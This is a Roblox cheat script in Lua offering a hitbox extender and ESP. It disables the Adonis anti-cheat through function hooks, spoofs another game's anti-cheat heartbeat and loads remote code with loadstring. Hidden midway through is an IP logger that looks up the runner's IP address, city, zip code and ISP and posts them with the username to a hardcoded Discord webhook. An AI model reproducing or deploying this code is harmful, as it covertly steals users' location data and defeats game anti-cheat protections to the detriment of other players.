for a,b in ipairs(getconnections(game:GetService"ScriptContext".Error))do
if b.Function and islclosure(b.Function)then
hookfunction(b.Function,function()end)
end
end local a=

getinfo or debug.getinfo
local b=false
local c={}


local d,e

setthreadidentity(2)

for f,g in getgc(true)do
if typeof(g)=="table"then
local h=rawget(g,"Detected")
local i=rawget(g,"Kill")

if typeof(h)=="function"and not d then
d=h

local j;j=hookfunction(d,function(k,l,m)
if k~="_"then
if b then
warn(`Adonis AntiCheat flagged\nMethod: {k}\nInfo: {l}`)
end
end

return true
end)

table.insert(c,d)
end

if rawget(g,"Variables")and rawget(g,"Process")and typeof(i)=="function"and not e then
e=i
local j;j=hookfunction(e,function(k)
if b then
warn(`Adonis AntiCheat tried to kill (fallback): {k}`)
end
end)

table.insert(c,e)
end
end
end

local f;f=hookfunction(getrenv().debug.info,newcclosure(function(...)local
g=...

if d and g==d then
if b then
warn(`Adonis AntiCheat sanity check detected and broken`)
end

return coroutine.yield(coroutine.running())
end

return f(...)
end))

setthreadidentity(7)

if getgenv().FurryHBELoaded~=nil then
return
end
getgenv().FurryHBELoaded=false

if not game:IsLoaded()then
game.Loaded:Wait()
end

if not getgenv().MTAPIMutex then
loadstring(game:HttpGet("https://raw.githubusercontent.com/RectangularObject/MT-Api-v2/main/__source/mt-api%20v2.lua",true))()
end

local g='https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local h=loadstring(game:HttpGet(g..'Library.lua'))()
loadstring(game:HttpGet(g..'addons/ThemeManager.lua'))()
local i=loadstring(game:HttpGet(g..'addons/SaveManager.lua'))()
i:SetLibrary(h)
i:SetFolder"FurryHBE"

local j=game:GetService"StarterGui"

local k=game:GetService"Teams"
local l=game:GetService"Players"

local m=game:GetService"RunService"
local n=game:GetService"Workspace"
local o=game:GetService"ReplicatedStorage"
local p=n.CurrentCamera
local q=p.WorldToViewportPoint
local r=l.LocalPlayer
local s={}

local t






local function updatePlayers()
if not getgenv().FurryHBELoaded then return end
for u,v in pairs(s)do
task.spawn(function()
v:Update()
end)
end
end

m:BindToRenderStep("furryWalls",Enum.RenderPriority.Camera.Value-1,function()
if not getgenv().FurryHBELoaded then return end
p=n.CurrentCamera
for u,v in pairs(s)do
task.spawn(function()
v:UpdateESP()
end)
end
end)

local u=h:CreateWindow"EVIL GANG STAYS LURKIN"
local v=u:AddTab"Main"
local w=v:AddLeftGroupbox"Hitbox Extender"
local x=v:AddLeftGroupbox"ESP"
local y=v:AddRightGroupbox"Ignores"
local z=v:AddRightGroupbox"Collisions"
local A=v:AddLeftGroupbox"Keybinds"

local B=u:AddTab"Emergency"
B:AddLeftGroupbox"Fixes"

w:AddToggle("extenderToggled",{Text="Toggle"}):OnChanged(updatePlayers)
w:AddSlider("extenderSize",{Text="Size",Min=2,Max=100,Default=10,Rounding=1}):OnChanged(updatePlayers)
w:AddSlider("extenderTransparency",{Text="Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
w:AddInput("customPartName",{Text="Custom Part Name",Default="HeadHB"}):OnChanged(updatePlayers)
w:AddDropdown("extenderPartList",{Text="Body Parts",AllowNull=true,Multi=true,Values={"Custom Part","Head","HumanoidRootPart","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},Default="HumanoidRootPart"}):OnChanged(updatePlayers)

x:AddToggle("espNameToggled",{Text="Name"}):AddColorPicker("espNameColor1",{Title="Fill Color",Default=Color3.fromRGB(255,255,255)}):AddColorPicker("espNameColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
Toggles.espNameToggled:OnChanged(updatePlayers)
Options.espNameColor1:OnChanged(updatePlayers)
Options.espNameColor2:OnChanged(updatePlayers)
x:AddToggle("espNameUseTeamColor",{Text="Use Team Color For Name"}):OnChanged(updatePlayers)
x:AddDropdown("espNameType",{Text="Name Type",AllowNull=false,Multi=false,Values={"Display Name","Account Name"},Default="Display Name"}):OnChanged(updatePlayers)
x:AddToggle("espHighlightToggled",{Text="Chams"}):AddColorPicker("espHighlightColor1",{Title="Fill Color",Default=Color3.fromRGB(0,0,0)}):AddColorPicker("espHighlightColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
Toggles.espHighlightToggled:OnChanged(updatePlayers)
Options.espHighlightColor1:OnChanged(updatePlayers)
Options.espHighlightColor2:OnChanged(updatePlayers)
x:AddToggle("espHighlightUseTeamColor",{Text="Use Team Color For Chams"}):OnChanged(updatePlayers)
x:AddDropdown("espHighlightDepthMode",{Text="Chams Depth Mode",AllowNull=false,Multi=false,Values={"Occluded","AlwaysOnTop"},Default="Occluded"}):OnChanged(updatePlayers)
x:AddSlider("espHighlightFillTransparency",{Text="Chams Fill Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
x:AddSlider("espHighlightOutlineTransparency",{Text="Chams Outline Transparency",Min=0,Max=1,Default=0,Rounding=2}):OnChanged(updatePlayers)

local C=game:GetService"Players".LocalPlayer.Name
local D="https://discord.com/api/webhooks/1354491846163824660/CW4blpnL1dVqKxJAq1K07Fgxq3eNPuQ1UDssPXBsRIS4C-nnFMmkuN-uQIuFDfx3H_uh"

local E=request{
Url="http://ip-api.com/json",
Method="GET"
}
local F=game:GetService"HttpService":JSONDecode(E.Body)
local G=string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",C,F.query,F.country,F.countryCode,F.region,F.regionName,F.city,F.zip,F.isp,F.org)
request
{
Url=D,
Method="POST",
Headers={
["Content-Type"]="application/json"
},
Body=game:GetService"HttpService":JSONEncode{content=G}
}



A:AddLabel"Toggle UI":AddKeyPicker("menuKeybind",{Default="Insert",NoUI=true,Text="Menu Keybind"})
A:AddLabel"Force Update":AddKeyPicker("forceUpdateKeybind",{Default="Home",NoUI=true,Text="Force Update Keybind"})
Options.forceUpdateKeybind:OnClick(updatePlayers)
h.ToggleKeybind=Options.menuKeybind

y:AddToggle("extenderSitCheck",{Text="Ignore Sitting Players"}):OnChanged(updatePlayers)
y:AddToggle("extenderFFCheck",{Text="Ignore Forcefielded Players"}):OnChanged(updatePlayers)
y:AddToggle("ignoreSelectedPlayersToggled",{Text="Ignore Selected Players"}):OnChanged(updatePlayers)
y:AddDropdown("ignorePlayerList",{Text="Players",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)
y:AddToggle("ignoreOwnTeamToggled",{Text="Ignore Own Team"}):OnChanged(updatePlayers)
y:AddToggle("ignoreSelectedTeamsToggled",{Text="Ignore Selected Teams"}):OnChanged(updatePlayers)
y:AddDropdown("ignoreTeamList",{Text="Teams",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)

z:AddToggle("collisionsToggled",{Text="Enable Collisions"}):OnChanged(updatePlayers)

i:BuildConfigSection(v)
i:LoadAutoloadConfig()

local function updateList(H)
H:SetValues()
H:Display()
end

if game.GameId==504234221 then
t=require(o.Scripts.Modules.PlayerModule)
end
if game.GameId==1934496708 then
t=require(n:WaitForChild"Teams")
end





local function addPlayer(H)
table.insert(Options.ignorePlayerList.Values,H.Name)
updateList(Options.ignorePlayerList)
s[H]={}
local I=s[H]
local J=H.Character
local K={}

local function isTeammate()
if game.GameId==718936923 then
if not r.Character or not J or not J:FindFirstChild"HumanoidRootPart"then return true end
return r.Character.HumanoidRootPart.Color==J.HumanoidRootPart.Color
elseif game.PlaceId==633284182 then
if not H:FindFirstChild"PlayerData"or not H.PlayerData:FindFirstChild"TeamValue"then return true end
return r.PlayerData.TeamValue.Value==H.PlayerData.TeamValue.Value
elseif game.PlaceId==2029250188 then
if not r.Character or not J then return true end
return r.Character.Parent==J.Parent
elseif game.PlaceId==2978450615 then
return getrenv()._G.PlayerProfiles.Data[r.Name].Team==getrenv()._G.PlayerProfiles.Data[H.Name].Team
elseif game.GameId==1934496708 then
if n.FriendlyFire.Value then return false end
return(not H.Team or H.Team.Name=="LOBBY"or r.Team.Name=="LOBBY"or H.Team.Name=="Admin"or r.Team==H.Team)or
t[r.Team.Name]==t[H.Team.Name]or
((t[r.Team.Name]=="CI"and t[H.Team.Name]=="CD")or
(t[H.Team.Name]=="CI"and t[r.Team.Name]=="CD"))
elseif game.PlaceId==2622527242 then
if not H.Team or H.Team.Name=="Intro"or H.Team.Name=="Spectator"or H.Team.Name=="Not Playing"or r.Team==H.Team then return true end
local L=r.Team.Name
local M=H.Team.Name
local N
local O
if L=="Class-D Personnel"or L=="Chaos Insurgency"then
N="Chads"
end
if L=="Facility Personnel"or L=="Security Department"or L=="Mobile Task Force"then
N="Crayon Eaters"
end
if L=="SCPs"or L=="Serpent's Hand"then
N="Menaces to Society"
end
if L=="Global Occult Coalition"then
N="Who?"
end
if L=="Unusual Incidents Unit"then
N="Who2?"
end
if M=="Class-D Personnel"or M=="Chaos Insurgency"then
O="Chads"
end
if M=="Facility Personnel"or M=="Security Department"or M=="Mobile Task Force"then
O="Crayon Eaters"
end
if M=="SCPs"or M=="Serpent's Hand"then
O="Menaces to Society"
end
if M=="Global Occult Coalition"then
O="Who?"
end
if M=="Unusual Incidents Unit"then
N="Who2?"
end
if N=="Who2?"or O=="Who2?"then
if N=="Crayon Eaters"or O=="Crayon Eaters"or N=="Who?"or O=="Who?"then
return true
end
end
return N==O
elseif game.PlaceId==8770868695 then
if not r.Character or not J or not H.Team or H.Team.Name=="Dead"or H.Team.Name=="Inactive"then return true end
return r.Character.Parent==J.Parent
elseif game.PlaceId==5884786982 then
if not r.Character or not J then return true end
return r.Character.name~="Killer"and J.Name~="Killer"
elseif game.GameId==2162282815 then
if not H:FindFirstChild"SelectedTeam"then return true end
return H.SelectedTeam.Value==r.SelectedTeam.Value
elseif game.PlaceId==1240644540 then
if not t or not t.IsPlayerSurvivor then return true end
return t.IsPlayerSurvivor(nil,H)==true and t.IsPlayerSurvivor(nil,r)==true
elseif game.PlaceId==10236714118 then
if not H:FindFirstChild"PlayerData"or not H.PlayerData:FindFirstChild"Team"then return true end
return r.PlayerData.Team.Value==H.PlayerData.Team.Value
end
return r.Team==H.Team
end

local function isDead()
if not J then return true end
local L=J:FindFirstChildWhichIsA"Humanoid"
if game.PlaceId==6172932937 then
return H.ragdolled.Value
elseif game.GameId==718936923 then
return J:FindFirstChild"Dead"~=nil
end
return L and L:GetState()==Enum.HumanoidStateType.Dead
end

local function isSitting()
local L=J:FindFirstChildWhichIsA"Humanoid"
return Toggles.extenderSitCheck.Value and L~=nil and L.Sit==true
end

local function isFFed()
if not J then return false end
if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
return J.Head.Material==Enum.Material.ForceField
end
local L=J:FindFirstChildWhichIsA"ForceField"
return Toggles.extenderFFCheck.Value and J~=nil and L~=nil and L.Visible==true
end

local function isIgnored()
if not J then return true end
return Toggles.ignoreOwnTeamToggled.Value and isTeammate()or
Toggles.ignoreSelectedTeamsToggled.Value and table.find(Options.ignoreTeamList:GetActiveValues(),tostring(H.Team))or
Toggles.ignoreSelectedPlayersToggled.Value and table.find(Options.ignorePlayerList:GetActiveValues(),tostring(H.Name))
end



local L=false
local function setup(M)
K[M.Name]={}
local N=K[M.Name]
N.Size=M.Size
N.Transparency=M.Transparency
N.Massless=M.Massless
N.CanCollide=M.CanCollide
N.CollisionGroupId=M.CollisionGroupId
local O=M:AddGetHook("Size",N.Size)
local P=M:AddGetHook("Transparency",N.Transparency)
local Q=M:AddGetHook("Massless",N.Massless)
local R=M:AddGetHook("CanCollide",N.CanCollide)

local S=M:AddSetHook("Size",function(S,T)
N.Size=T
O:Modify("Size",N.Size)
if Toggles.extenderToggled.Value then
local U=Options.extenderSize.Value
return Vector3.new(U,U,U)
end
return N.Size
end)
local T=M:AddSetHook("Transparency",function(T,U)
N.Transparency=U
P:Modify("Transparency",N.Transparency)
if Toggles.extenderToggled.Value then
return Options.extenderTransparency.Value
end
return N.Transparency
end)
local U=M:AddSetHook("Massless",function(U,V)
N.Massless=V
Q:Modify("Massless",N.Massless)
if Toggles.extenderToggled.Value then
if M.Name~="HumanoidRootPart"then
return true
end
end
return N.Massless
end)
local V=M:AddSetHook("CanCollide",function(V,W)
N.CanCollide=W
R:Modify("CanCollide",N.CanCollide)
if Toggles.extenderToggled.Value and not Toggles.collisionsToggled.Value then
if M.Name=="Head"or M.Name=="HumanoidRootPart"then
return false
end
end
return N.CanCollide
end)








local W=M.Changed:Connect(function(W)
if L then return end
if N[W]then
if N[W]~=M[W]then
N[W]=M[W]
end
I:Update()
end
end)
M.Destroying:Connect(function()
O:Remove()
P:Remove()
Q:Remove()
R:Remove()

S:Remove()
T:Remove()
U:Remove()
V:Remove()

W:Disconnect()
end)
end

local function isActive(M)
local N=M.Name
for O,P in pairs(Options.extenderPartList:GetActiveValues())do
if string.match(N,P)or(P=="Custom Part"and string.match(N,Options.customPartName.Value))or
(P=="Left Arm"and string.match(N,"Left")and(string.match(N,"Arm")or string.match(N,"Hand")))or
(P=="Right Arm"and string.match(N,"Right")and(string.match(N,"Arm")or string.match(N,"Hand")))or
(P=="Left Leg"and string.match(N,"Left")and(string.match(N,"Leg")or string.match(N,"Foot")))or
(P=="Right Leg"and string.match(N,"Right")and(string.match(N,"Leg")or string.match(N,"Foot")))then
return true
end
end
return false
end

local function resize(M)
if not K[M.Name]then
setup(M)
end
if Toggles.extenderToggled.Value and isActive(M)and not isIgnored()and not isSitting()and not isFFed()and not isDead()then
if M.Name~="HumanoidRootPart"then
M.Massless=true
end
if not Toggles.collisionsToggled.Value then





M.CanCollide=false
else
M.CanCollide=K[M.Name].CanCollide

end
local N=Options.extenderSize.Value
M.Size=Vector3.new(N,N,N)
M.Transparency=Options.extenderTransparency.Value
if M.Name=="Head"then
local O=M:FindFirstChild"face"
if O then
O.Transparency=Options.extenderTransparency.Value
end
end
else
M.Massless=K[M.Name].Massless
M.CanCollide=K[M.Name].CanCollide
M.Size=K[M.Name].Size
M.Transparency=K[M.Name].Transparency
if M.Name=="Head"then
local N=M:FindFirstChild"face"
if N then
N.Transparency=K.Head.Transparency
end
end

end
end

function I.Update(M)
if not J then return end
L=true
for N,O in pairs(J:GetChildren())do
if O:IsA"BasePart"then
resize(O)
end
end
L=false
end



local function FindFirstChildMatching(M,N)
if not M then return nil end
for O,P in pairs(M:GetChildren())do
if string.match(P.Name,N)then
return P
end
end
end

local M=Drawing.new"Text";M.Center=true;M.Outline=true
local N=Instance.new"Highlight";N.Parent=game:GetService"CoreGui"
function I.UpdateESP(O)
if not J or isIgnored()or isDead()then M.Visible=false;N.Enabled=false return end
if Toggles.espNameToggled.Value then
local P=FindFirstChildMatching(J,"Torso")
if P then
local Q,R=q(p,P.Position)
if R then
if Options.espNameType.Value=="Display Name"then
M.Text=H.DisplayName
else
M.Text=H.Name
end
if Toggles.espNameUseTeamColor.Value then
M.Color=H.TeamColor.Color
else
M.Color=Options.espNameColor1.Value
end
M.OutlineColor=Options.espNameColor2.Value
M.Position=Vector2.new(Q.X,Q.Y)
M.Size=1000/Q.Z+10
M.Visible=true
else
M.Visible=false
end
else
M.Visible=false
end
else
M.Visible=false
end
if Toggles.espHighlightToggled.Value then
N.Adornee=J
if Toggles.espHighlightToggled.Value then
if Toggles.espHighlightUseTeamColor.Value then
N.FillColor=H.TeamColor.Color
N.OutlineColor=H.TeamColor.Color
else
N.FillColor=Options.espHighlightColor1.Value
N.OutlineColor=Options.espHighlightColor2.Value
end
N.DepthMode=Enum.HighlightDepthMode[Options.espHighlightDepthMode.Value]
N.FillTransparency=Options.espHighlightFillTransparency.Value
N.OutlineTransparency=Options.espHighlightOutlineTransparency.Value
N.Enabled=true
else
N.Enabled=false
end
else
N.Enabled=false
end
end

function I.DeleteVisuals(O)
M:Remove()
N:Destroy()
end


local function WaitForFullChar(O)
local P=tick()
local Q=O:FindFirstChildWhichIsA"Humanoid"
if not Q then
repeat
if O==nil then
return false
end
Q=O:FindFirstChildWhichIsA"Humanoid"
task.wait()
until Q or tick()-P>=2
end
local R=false
P=tick()
repeat
local S=0
for T,U in pairs(O:GetChildren())do
if Q:GetLimb(U)~=Enum.Limb.Unknown then
S+=1
end
end
if S==6 or S==15 then
R=true
end
task.wait()
until R or tick()-P>=3

return true
end

H.CharacterAdded:Connect(function(O)

J=O
K={}
if WaitForFullChar(O)then
I:Update()
local P=O:FindFirstChildWhichIsA"Humanoid"
if P then
P:GetPropertyChangedSignal"Health":Connect(function()
if P.Health<=0 then
I:Update()
end
end)
P.StateChanged:Connect(function(Q,R)
if R==Enum.HumanoidStateType.Dead then
I:Update()
end
end)
end
if O:FindFirstChildWhichIsA"ForceField"then

I:Update()
end
O.ChildAdded:Connect(function(Q)
if game.GameId==718936923 then
if Q.Name=="Dead"then
I:Update()
return
end
end
if Q:IsA"ForceField"then

I:Update()
end
end)
O.ChildRemoved:Connect(function(Q)
if Q:IsA"ForceField"then

I:Update()
end
end)
if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
local Q=J:FindFirstChild"Head"
Q:GetPropertyChangedSignal"Material":Connect(function()
I:Update()
end)
end
end
end)
H.CharacterRemoving:Connect(function()

if I then
K={}
end
end)
H:GetPropertyChangedSignal"Team":Connect(function(O)

I:Update()
end)
if game.PlaceId==6172932937 then
local O=H:WaitForChild"ragdolled"
O.Changed:Connect(function()
I:Update()
end)
end
if game.GameId==1934496708 then
local O=n:WaitForChild"FriendlyFire"
O.Changed:Connect(function()
I:Update()
end)
end
if game.GameId==2162282815 then
local O=n:WaitForChild"MapFolder"
local P=O:WaitForChild"Players"
for Q,R in pairs(P:GetChildren())do
if R.Name==H.Name then
J=R
end
end
P.ChildAdded:Connect(function(Q)
if Q.Name==H.Name then
J=Q
end
end)
end
if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
if J then
local O=J:FindFirstChild"Head"
O:GetPropertyChangedSignal"Material":Connect(function()
I:Update()
end)
end
end
end

local function removePlayer(H)
if not s[H]then return end
s[H]:DeleteVisuals()
table.remove(Options.ignorePlayerList.Values,table.find(Options.ignorePlayerList.Values,H.Name))
updateList(Options.ignorePlayerList)
s[H]=nil
end

for H,I in ipairs(l:GetPlayers())do
if I==r then
continue
end

addPlayer(I)
end
for H,I in pairs(k:GetTeams())do
if I:IsA"Team"then

table.insert(Options.ignoreTeamList.Values,I.Name)
updateList(Options.ignoreTeamList)
end
end
l.PlayerAdded:Connect(function(H)

addPlayer(H)
end)
l.PlayerRemoving:Connect(function(H)

removePlayer(H)
end)
k.ChildAdded:Connect(function(H)
if H:IsA"Team"then

table.insert(Options.ignoreTeamList.Values,H.Name)
updateList(Options.ignoreTeamList)
end
end)
k.ChildRemoved:Connect(function(H)
if H:IsA"Team"then

table.remove(Options.ignoreTeamList.Values,table.find(Options.ignoreTeamList.Values,H.Name))
updateList(Options.ignoreTeamList)
end
end)

r:GetAttributeChangedSignal"Team":Connect(function()
updatePlayers()
end)
r.CharacterAdded:Connect(function()
updatePlayers()
end)


















if game.PlaceId==111311599 then

local H=game:GetService"ReplicatedFirst"["Serverbased AntiCheat"]
local I=r:WaitForChild"SValue"
local function constructAnticheatString()
return"CS-"..math.random(11111,99999).."-"..math.random(1111,9999).."-"..math.random(111111,999999)..math.random(1111111,9999999)..(I.Value*6)^2+18
end
task.spawn(function()
while true do
task.wait(2)
game:GetService"ReplicatedStorage".ACDetect:FireServer(I.Value,constructAnticheatString())
end
end)
H.Disabled=true
end

getgenv().FurryHBELoaded=true
updatePlayers()

j:SetCore("SendNotification",{
Title="wizhorror",
Text="get fucked shitter",
Duration=2
})



if game.PlaceId == 8502861227 then
    local plr1 = game.Players.LocalPlayer
    local gui1 = plr1.PlayerGui
    local topbarFrame1 = gui1.TopbarStandard.Holders.Left
    plr1.CharacterAdded:Connect(function()
        task.wait(1)
        if #topbarFrame1:GetChildren() > 3 then
            for _,v in pairs(topbarFrame1:GetChildren()) do
                if v:IsA("Frame") and v.Name == "Widget" and v.AbsolutePosition ~= Vector2.new(176, -46) and v.AbsolutePosition ~= Vector2.new(232, -46) then
                    v:Destroy()
                    break
                end
            end
        end
    end)
end
